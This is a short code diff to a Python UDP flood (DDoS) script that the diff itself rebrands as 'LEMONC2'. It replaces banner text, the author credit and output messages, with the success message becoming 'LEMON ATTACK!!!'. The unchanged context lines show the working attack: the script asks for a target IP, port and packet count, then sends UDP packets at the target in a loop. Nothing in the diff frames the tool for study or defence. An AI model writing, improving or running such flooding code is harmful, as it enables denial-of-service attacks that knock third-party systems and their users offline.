@@ -17,13 +17,13 @@ from os import system, name
 
 print("\033[1;34;40m \n")
 os.system("figlet DDOS ATTACK -f slant")
-print("\033[1;33;40m If you have any issue post a thread on https://github.com/XaviFortes/Python-UDP-Flood/issues\n")
+print("\033[1;33;40m LEMONC2 YOUTUBE:Lemon us udp(version 1.1.) C2\n")
 
-print("\033[1;32;40m ==> Code by Karasu <==  \n")
+print("\033[1;32;40m > LEMONC2 <  \n")
 test = input()
 if test == "n":
 	exit(0)
-ip = str(input(" Host/Ip:"))
+ip = str(input("IP:"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
 times = int(input(" Packets per one connection:"))
@@ -37,7 +37,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"UDP Sent!!!")
+			print(i +"LEMON ATTACK!!!")
 		except:
 			s.close()
 			print("[!] Error!!!")
